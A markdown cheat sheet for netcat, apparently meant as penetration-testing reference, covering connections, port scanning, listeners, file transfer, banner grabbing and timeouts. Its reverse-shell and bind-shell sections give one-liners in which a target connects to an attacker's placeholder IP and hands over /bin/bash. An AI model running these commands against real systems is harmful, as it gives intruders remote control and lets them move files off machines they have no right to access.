# 🔌 Netcat Cheat Sheet (Network Cat)

`< >` indicates user input.

---

##  Basic Connections

| Command | Description |
|--------|-------------|
| `nc <target> <port>` | Connect to a remote service |
| `nc -v <target> <port>` | Verbose connection |
| `nc -zv <target> <port>` | Scan a specific port |
| `nc -zv <target> <start_port>-<end_port>` | Scan a range of ports |

Example:

```bash
nc <target_ip> 80
```

---

##  Listening Mode

| Command | Description |
|--------|-------------|
| `nc -l <port>` | Start listener on a port |
| `nc -lv <port>` | Listener with verbose output |
| `nc -lvnp <port>` | Listener with port and no DNS resolution |

Example:

```bash
nc -lvnp 4444
```

---

## 📂 File Transfer

| Command | Description |
|--------|-------------|
| `nc -lvnp <port> > <file>` | Receive file |
| `nc <target> <port> < <file>` | Send file |

Example:

Receiver:

```bash
nc -lvnp 4444 > received_file.txt
```

Sender:

```bash
nc <target_ip> 4444 < file.txt
```

---

##  Reverse Shell

| Command | Description |
|--------|-------------|
| `nc <attacker_ip> <port> -e /bin/bash` | Reverse shell (target connects back) |

Example:

Listener (attacker):

```bash
nc -lvnp 4444
```

Target machine:

```bash
nc <attacker_ip> 4444 -e /bin/bash
```

---

##  Bind Shell

| Command | Description |
|--------|-------------|
| `nc -lvnp <port> -e /bin/bash` | Bind shell on target |

Example:

Target machine:

```bash
nc -lvnp 4444 -e /bin/bash
```

Attacker connects:

```bash
nc <target_ip> 4444
```

---

## Banner Grabbing

| Command | Description |
|--------|-------------|
| `nc <target> <port>` | Manually interact with service |
| `nc <target> 80` | Connect to web server |

Example:

```bash
nc <target_ip> 80
```

Then send a request:

```
GET / HTTP/1.1
Host: example.com
```

---

##  Timeout Option

| Command | Description |
|--------|-------------|
| `nc -w <seconds> <target> <port>` | Set connection timeout |

Example:

```bash
nc -w 3 <target_ip> 80
```
